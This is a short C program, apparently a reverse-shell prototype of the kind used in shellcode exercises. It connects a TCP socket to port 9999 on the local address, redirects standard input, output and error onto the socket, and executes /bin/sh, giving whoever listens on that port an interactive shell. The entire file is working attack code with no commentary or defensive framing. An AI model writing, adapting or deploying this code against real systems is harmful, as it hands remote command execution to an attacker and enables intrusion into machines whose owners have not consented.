#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
	struct sockaddr_in client_addr;
	int client_sockfd;

	client_sockfd = socket(PF_INET, SOCK_STREAM, 0);

	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(9999);
	client_addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(client_addr.sin_zero), '\0', 8);

	connect(client_sockfd, (struct sockaddr *) &client_addr, sizeof(struct sockaddr));


	dup2(client_sockfd, 0);
	dup2(client_sockfd, 1);
	dup2(client_sockfd, 2);


	char filename[] = "/bin/sh\x00";

	char *argv[] = {filename, 0};
	char *envp[] = {0};

	execve(filename, argv, envp);
}